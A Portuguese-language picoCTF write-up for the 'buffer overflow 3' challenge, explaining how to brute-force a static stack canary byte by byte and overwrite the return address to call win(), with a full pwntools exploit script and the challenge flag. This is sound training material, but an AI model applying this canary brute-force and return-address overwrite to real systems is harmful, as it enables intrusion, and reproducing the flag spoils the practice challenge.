# WriteUp: buffer overflow 3
## Descrição do Desafio:
**Author**: Sanjay C / Palash Oswal \
**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/260?category=6&page=3) \
**Categoria**: Binary Exploitation \
**Dificuldade**: Difícil \
**Data**: 2022 \
**Descrição**:
> Do you think you can bypass the protection and get the flag?
## Passo a Passo da Solução
### 1. Análise do arquivo fornecido
Assim como os anteriores, este fornece o arquivo fonte, `vuln.c`. A análise deste arquivo nos mostra que há uma vulnerabilidade de `buffer overflow` na função `vuln()`, mas dessa vez temos um desafio no caminho, a existência de um canário de 4 caracteres.
```c
void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}
```
Também podemos identificar a existência da função `win()`, dessa vez sem parâmetros.
### 2. Exploit
O objetivo é o mesmo dos anteriors, sobrescrever o valor de retorno da função `vuln()`, mas dessa vez temos que descobrir o valor do canário para sobrescrevermos ele com o mesmo valor, e dessa forma não causar erro no programa.

Por sorte, o canário é de apenas 4 caracteres, e ele é lido de um arquivo `canary.txt`, então isso significa que ele não é aleatório.
### 3. Solução
A solução encontrada pode não ser a melhor, mas funciona. Como o canário tem apenas 4 caracteres, foi usado força bruta para descobrir o valor dele.

A lógica, é percorrer cada letra e número do alfabeto e ir sobrescrevendo apenas um caractere por vez, aí se não ocorrer erro, encontramos um caractere da canário, e caso ocorra erro continuamos a percorrer os caracteres possíveis.
### 3.1 Solução com Python
```py
from pwn import *

elf = context.binary = ELF("./vuln")

def brute_forcing():
    canary = b""
    for i in range(4):
        caracteres = string.ascii_letters + string.digits
        for c in caracteres:
            c = str.encode(c)
            try:
                p = remote(ip, porta) #Troque pelos valores fornecidos

                p.sendlineafter(b"> ", str.encode(str(64 + i + 1)))
                p.sendlineafter(b"Input> ", fit({64: canary + c}))

                resposta = p.recvline()
                if b"Stack Smashing Detected" in resposta:
                    continue
                else:
                    canary += c
                    break
            finally:
                p.close()
    return canary

payload = flat(
    "A" * 64,
    brute_forcing(),
    "A" * 16,
    elf.sym["win"],
    0x0
)

p = remote(ip, porta) #Troque pelos valores fornecidos
p.sendlineafter(b"> ", b"92")
p.sendlineafter(b"Input> ", payload)
print(p.recvall().decode())
```

### Flag
`picoCTF{Stat1C_c4n4r13s_4R3_b4D_0bf0b08e}`
## Autor
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
